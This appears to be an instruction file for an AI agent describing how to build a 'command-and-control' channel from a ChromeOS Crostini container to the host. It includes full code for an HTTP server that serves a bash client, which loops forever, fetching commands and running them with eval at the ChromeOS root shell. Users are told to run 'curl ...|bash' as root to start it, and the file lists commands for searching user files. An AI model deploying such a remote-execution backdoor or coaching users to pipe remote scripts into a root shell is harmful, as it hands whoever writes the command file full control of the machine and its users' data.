# ChromeOS C2 Setup Task

You are setting up a command-and-control channel to execute commands on a ChromeOS host from Crostini.

## Architecture

```
ChromeOS VT2 (root)  <--HTTP-->  Crostini (server.py)  <--SSH-->  Agent (you)
       |                              |
       | polls /cmd every 0.3s        | commands.txt (you write)
       | posts result to /out         | output.txt (you read)
```

## Your Tasks

### 1. SSH into Crostini

```bash
ssh chromeos
```

### 2. Create the C2 directory and server

```bash
mkdir -p ~/c2
cd ~/c2
```

Create `~/c2/server.py` with this content:

```python
#!/usr/bin/env python3
"""C2 Server - polls commands.txt, receives output to output.txt"""
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import sys, os

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8888
DIR = os.path.dirname(os.path.abspath(__file__)) or "."

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"[{ts}] {msg}")

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args): pass
    
    def do_GET(self):
        if self.path == "/cmd":
            cmd_file = f"{DIR}/commands.txt"
            try:
                with open(cmd_file) as f:
                    cmd = f.read().strip()
                if cmd:
                    log(f"CMD >>> {cmd}")
                    open(cmd_file, "w").close()
                else:
                    cmd = ""
            except FileNotFoundError:
                cmd = ""
            self.send_response(200)
            self.end_headers()
            self.wfile.write(cmd.encode())
            
        elif self.path == "/c":
            log("Client requested bootstrap script")
            self.send_response(200)
            self.end_headers()
            # Client script - runs on ChromeOS VT2
            client = f"""#!/bin/bash
H=100.115.92.206:{PORT}
echo "C2 client started, polling $H"
while true; do
  C=$(curl -s $H/cmd)
  if [ -n "$C" ]; then
    echo ">>> $C"
    OUT=$(eval "$C" 2>&1)
    echo "$OUT"
    curl -s -X POST -d "$OUT" $H/out
  fi
  sleep 0.3
done
"""
            self.wfile.write(client.encode())
            
        elif self.path == "/ping":
            log("PING from client")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"pong")
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == "/out":
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode()
            with open(f"{DIR}/output.txt", "w") as f:
                f.write(body)
            log(f"OUT <<< ({len(body)} bytes)")
            for line in body.split('\n')[:10]:  # first 10 lines
                print(f"    {line}")
            if body.count('\n') > 10:
                print(f"    ... ({body.count(chr(10)) - 10} more lines)")
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

log(f"Server starting on port {PORT}")
log(f"User should type on VT2: curl 100.115.92.206:{PORT}/c|bash")
log(f"Waiting for client...")
HTTPServer(("", PORT), Handler).serve_forever()
```

Make it executable:
```bash
chmod +x ~/c2/server.py
```

### 3. Tell the user to start the server and connect

Tell the user:

> **Setup ready!** Please do the following:
> 
> **Terminal 1 (Crostini):** Run the server
> ```
> cd ~/c2 && python3 server.py
> ```
> 
> **VT2 (ChromeOS root):** Type this (31 chars):
> ```
> curl 100.115.92.206:8888/c|bash
> ```
> 
> Let me know when both are running and I'll test with a command.

### 4. Wait for user confirmation, then test

Once user confirms both are running, test by running:

```bash
ssh chromeos "echo 'echo hello from chromeos' > ~/c2/commands.txt && sleep 1 && cat ~/c2/output.txt"
```

You should see "hello from chromeos" in the output.

### 5. Running commands

To execute a command on ChromeOS host:

```bash
# SSH to crostini first
ssh chromeos

# Send a command
echo 'ls -la /home' > ~/c2/commands.txt

# Wait a moment, then read output
sleep 1
cat ~/c2/output.txt
```

Or as a one-liner from outside:
```bash
ssh chromeos "echo 'whoami' > ~/c2/commands.txt && sleep 1 && cat ~/c2/output.txt"
```

### 6. Useful exploration commands to try

Once working, explore the ChromeOS filesystem:
```bash
# Find user data
echo 'find /home -name "Downloads" 2>/dev/null' > ~/c2/commands.txt

# Check mounts
echo 'mount | head -30' > ~/c2/commands.txt

# What's running
echo 'ps aux | head -20' > ~/c2/commands.txt

# Network
echo 'ip addr' > ~/c2/commands.txt
```

## Troubleshooting

- **No output.txt appearing**: Check server.py is running, check curl works from VT2
- **Connection refused**: Verify IP (might not be .206), try `ip addr` in Crostini
- **Commands not executing**: Check the client is running on VT2 (should show "C2 client started")

## Files Summary

| Location | File | Purpose |
|----------|------|---------|
| Crostini | ~/c2/server.py | HTTP server, serves client, relays commands |
| Crostini | ~/c2/commands.txt | Write commands here (agent) |
| Crostini | ~/c2/output.txt | Read results here (agent) |
| ChromeOS | (in memory) | Client script runs from curl pipe |
